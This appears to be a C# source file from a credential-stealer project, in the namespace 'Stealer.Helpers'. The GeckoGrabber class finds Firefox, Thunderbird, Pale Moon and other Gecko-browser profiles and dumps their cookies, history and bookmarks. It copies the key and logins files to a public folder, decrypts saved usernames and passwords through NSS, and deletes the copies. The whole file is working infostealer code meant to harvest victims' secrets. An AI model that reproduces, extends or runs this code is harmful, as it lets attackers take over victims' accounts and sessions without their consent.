using Stealer.Helpers;
using System;
using System.Collections.Generic;
using System.Collections.Generic;
using System.IO;

public class GeckoGrabber
{
    private static string DEFAULT_APPDATA = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
    private static string SystemDrive = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
    private static string CopyTempPath = Path.Combine(SystemDrive, "Users\\Public");
    private static string[] RequiredFiles = new string[] { "key3.db", "key4.db", "logins.json", "cert9.db" };

    private static List<Tuple<GeckoBasedBrowser, string>> Browsers = new List<Tuple<GeckoBasedBrowser, string>>()
    {
        new Tuple<GeckoBasedBrowser, string>(GeckoBasedBrowser.Firefox, DEFAULT_APPDATA + "Mozilla\\Firefox"),
        new Tuple<GeckoBasedBrowser, string>(GeckoBasedBrowser.Waterfox, DEFAULT_APPDATA + "Waterfox"),
        new Tuple<GeckoBasedBrowser, string>(GeckoBasedBrowser.KMeleon, DEFAULT_APPDATA + "K-Meleon"),
        new Tuple<GeckoBasedBrowser, string>(GeckoBasedBrowser.Thunderbird, DEFAULT_APPDATA + "Thunderbird"),
        new Tuple<GeckoBasedBrowser, string>(GeckoBasedBrowser.IceDragon, DEFAULT_APPDATA + "Comodo\\IceDragon"),
        new Tuple<GeckoBasedBrowser, string>(GeckoBasedBrowser.Cyberfox, DEFAULT_APPDATA + "8pecxstudios\\Cyberfox"),
        new Tuple<GeckoBasedBrowser, string>(GeckoBasedBrowser.BlackHaw, DEFAULT_APPDATA + "NETGATE Technologies\\BlackHaw"),
        new Tuple<GeckoBasedBrowser, string>(GeckoBasedBrowser.PaleMoon, DEFAULT_APPDATA + "Moonchild Productions\\Pale Moon"),
    };

    private static string CopyRequiredFiles(string profile)
    {
        string profileName = new DirectoryInfo(profile).Name;
        string newProfileName = Path.Combine(CopyTempPath, profileName);

        if (!Directory.Exists(newProfileName))
        {
            Directory.CreateDirectory(newProfileName);
        }

        foreach (string file in RequiredFiles)
        {
            try
            {
                string requiredFile = Path.Combine(profile, file);

                if (File.Exists(requiredFile))
                {
                    File.Copy(requiredFile, Path.Combine(newProfileName, Path.GetFileName(requiredFile)));
                }
            }
            catch
            {
                return null;
            }
        }

        return Path.Combine(CopyTempPath, profileName);
    }

    private static string GetBrowserDirectory(GeckoBasedBrowser browser)
    {
        foreach (Tuple<GeckoBasedBrowser, string> tuple in Browsers)
        {
            if (tuple.Item1.Equals(browser))
            {
                return tuple.Item2;
            }
        }

        return "";
    }

    public static string GetCookies(GeckoBasedBrowser browser)
    {
        string dir = GetBrowserDirectory(browser);

        if (!System.IO.Directory.Exists(dir))
        {
            return "";
        }

        string content = "";
        string profile = Profile.GetProfile(dir);

        if (profile == null)
        {
            return "";
        }

        string db_location = Path.Combine(profile, "cookies.sqlite");
        SQLite sSQLite = SQLite.ReadTable(db_location, "moz_cookies");

        if (sSQLite == null)
        {
            return "";
        }

        for (int i = 0; i < sSQLite.GetRowCount(); i++)
        {
            string theStr = "================================================================================================\r\n" +
                "Host: " + sSQLite.GetValue(i, 4) + "\r\n" +
                "Name: " + sSQLite.GetValue(i, 2) + "\r\n" +
                "Value: " + sSQLite.GetValue(i, 3) + "\r\n" +
                "Path: " + sSQLite.GetValue(i, 5) + "\r\n" +
                "Expires UTC: " + sSQLite.GetValue(i, 6);

            if (content == "")
            {
                content = theStr;
            }
            else
            {
                content += "\r\n" + theStr;
            }
        }

        if (content != "")
        {
            content += "\r\n================================================================================================";
        }

        return content;
    }

    public static string GetBookmarks(GeckoBasedBrowser browser)
    {
        string dir = GetBrowserDirectory(browser);

        if (!System.IO.Directory.Exists(dir))
        {
            return "";
        }

        string content = "";
        string profile = Profile.GetProfile(dir);

        if (profile == null)
        {
            return "";
        }

        string db_location = Path.Combine(profile, "places.sqlite");
        SQLite sSQLite = SQLite.ReadTable(db_location, "moz_bookmarks");

        if (sSQLite == null)
        {
            return "";
        }

        for (int i = 0; i < sSQLite.GetRowCount(); i++)
        {
            string title = Decryptor.GetUTF8(sSQLite.GetValue(i, 5));

            if (Decryptor.GetUTF8(sSQLite.GetValue(i, 1)).Equals("0") && title != "0")
            {
                string theStr = "================================================================================================\r\n" +
                    "Title: " + title;

                if (content == "")
                {
                    content = theStr;
                }
                else
                {
                    content += "\r\n" + theStr;
                }
            }
        }

        if (content != "")
        {
            content += "\r\n================================================================================================";
        }

        return content;
    }

    public static string GetHistory(GeckoBasedBrowser browser)
    {
        string dir = GetBrowserDirectory(browser);

        if (!System.IO.Directory.Exists(dir))
        {
            return "";
        }

        string content = "";
        string profile = Profile.GetProfile(dir);

        if (profile == null)
        {
            return "";
        }

        string db_location = Path.Combine(profile, "places.sqlite");
        SQLite sSQLite = SQLite.ReadTable(db_location, "moz_places");

        if (sSQLite == null)
        {
            return "";
        }

        for (int i = 0; i < sSQLite.GetRowCount(); i++)
        {
            string title = Decryptor.GetUTF8(sSQLite.GetValue(i, 2));

            if (title != "0")
            {
                string theStr = "================================================================================================\r\n" +
                    "Title: " + title + "\r\n" +
                    "URL: " + Decryptor.GetUTF8(sSQLite.GetValue(i, 1)) + "\r\n" +
                    "Visit count: " + (Convert.ToInt32(sSQLite.GetValue(i, 4)) + 1).ToString();

                if (content == "")
                {
                    content = theStr;
                }
                else
                {
                    content += "\r\n" + theStr;
                }
            }
        }

        if (content != "")
        {
            content += "\r\n================================================================================================";
        }

        return content;
    }

    public static string GetPasswords(GeckoBasedBrowser browser)
    {
        string dir = GetBrowserDirectory(browser);

        if (!System.IO.Directory.Exists(dir))
        {
            return "";
        }

        string content = "";
        string profile = Profile.GetProfile(dir);

        if (profile == null)
        {
            return "";
        }

        string Nss3Dir = Profile.GetMozillaPath();

        if (Nss3Dir == null)
        {
            return "";
        }

        string newProfile = CopyRequiredFiles(profile);

        if (newProfile == null)
        {
            return "";
        }

        string db_location = Path.Combine(newProfile, "logins.json");
        string JSON_STRING = File.ReadAllText(db_location);
        var json = new Json(JSON_STRING);
        json.Remove(new string[] { ",\"logins\":\\[", ",\"potentiallyVulnerablePasswords\"" });
        string[] accounts = json.SplitData();

        if (Decryptor.LoadNSS(Nss3Dir))
        {
            if (Decryptor.SetProfile(newProfile))
            {
                foreach (string account in accounts)
                {
                    var json_account = new Json(account);
                    string hostname = json_account.GetValue("hostname"), username = json_account.GetValue("encryptedUsername"), password = json_account.GetValue("encryptedPassword"), usernameField = json_account.GetValue("usernameField"), passwordField = json_account.GetValue("passwordField");

                    if (!string.IsNullOrEmpty(password))
                    {
                        string theStr = "================================================================================================\r\n" +
                            "URL: " + hostname + "\r\n" +
                            "Username: " + Decryptor.DecryptPassword(username) + "\r\n" +
                            "Password: " + Decryptor.DecryptPassword(password) + "\r\n" +
                            "Username field: " + usernameField + "\r\n" +
                            "Password field: " + passwordField;

                        if (content == "")
                        {
                            content = theStr;
                        }
                        else
                        {
                            content += "\r\n" + theStr;
                        }
                    }
                }

                Decryptor.UnLoadNSS();
            }
        }

        if (content != "")
        {
            content += "\r\n================================================================================================";
        }

        while (true)
        {
            try
            {
                Directory.Delete(newProfile, recursive: true);
                break;
            }
            catch
            {

            }
        }

        return content;
    }
}